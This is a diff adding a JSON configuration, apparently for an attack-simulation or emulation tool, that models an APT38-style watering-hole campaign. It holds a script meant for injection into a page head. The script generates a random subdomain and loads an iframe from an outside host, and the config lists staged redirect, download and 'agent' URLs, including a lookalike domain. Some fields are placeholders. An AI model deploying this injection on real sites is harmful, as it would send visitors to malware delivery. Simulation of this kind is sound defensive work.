@@ -1,0 +1,53 @@
+{
+    "attack_description": { "plain_text": "hello",
+        "report_sources": [
+            "<url>",
+            "<url>"
+        ],
+        "IOCs": [
+            "hash1",
+            "hash2"
+        ]
+    },
+    "simrules":{
+        "time_duration": "<start-time>~<end-time>",
+        "landing_host": "stackoverflow.com",
+        "landing_method": {
+            "method": "injection",
+            "location": "head",
+            "node_str": " <script> var charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567889-'; var subd = ''; for (let i=0; i<15; ++i) { let rand_pos = Math.floor(Math.random() * charset.length); subd += charset.substring(rand_pos, rand_pos+1); } f=document.createElement('iframe'); f.src=`https://${subd}.diobao.xyz/home.php`; f.height=1000; document.body.prepend(f); </script> ",
+            "host": "stackoverflow.com",
+            "url": "https://stackoverflow.com/",
+            "strict": false
+        },
+        "objects":[
+            {
+                "Content-Type": "text/html",
+                "name": "home.php",
+                "valid_from": null,
+                "valid_to": null,
+                "url": "https:\\/\\/.*?\\.diobao\\.xyz\\/home.php",
+                "on_land": true,
+                "identifier": "APT38_REDIR",
+                "regexp": true
+            },
+            {
+                "Content-Type": "text/html",
+                "name": "download_apt38.html",
+                "valid_from": null,
+                "valid_to": null,
+                "url": "https:\\/\\/.*?\\.googie\\.net\\/download_apt38.html",
+                "identifier": "APT38_DOWNLOAD",
+                "regexp": true
+            },
+            {
+                "Content-Type": "application/javascript",
+                "name": "download_apt38",
+                "valid_from": null,
+                "valid_to": null,
+                "url": "http://uface.eu/download_apt38",
+                "identifier": "APT38_AGENT"
+            }
+        ]
+    }
+}
